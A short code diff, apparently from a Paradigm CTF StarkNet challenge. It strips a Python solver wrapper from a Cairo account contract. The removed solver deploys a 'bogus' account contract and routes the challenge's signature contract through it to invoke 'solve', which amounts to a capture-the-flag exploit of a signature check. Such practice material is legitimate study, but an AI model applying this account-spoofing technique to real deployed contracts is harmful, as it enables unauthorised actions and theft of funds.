@@ -1,9 +1,3 @@
-from paradigmctf.cairo_challenge import *
-
-from starknet_py.net import AccountClient
-from starknet_py.contract import Contract
-
-contract = """
 %lang starknet
 
 from starkware.cairo.common.cairo_builtins import HashBuiltin, SignatureBuiltin, BitwiseBuiltin
@@ -114,17 +108,3 @@ func _from_call_array_to_call{syscall_ptr: felt*}(
     );
     return ();
 }
-"""
-async def solver(client: AccountClient, signature_contract: Contract):
-    deployment_result = await Contract.deploy(
-        client, compilation_source=contract
-    )
-    await deployment_result.wait_for_acceptance()
-    bogus_account_contract = deployment_result.deployed_contract
-
-    newClient = AccountClient(bogus_account_contract.address, client, supported_tx_version=1)
-    signature_contract._functions = signature_contract._make_functions(signature_contract.data, newClient)
-    result = await signature_contract.functions["solve"].invoke()
-    await result.wait_for_acceptance()
-
-run_solver(solver)
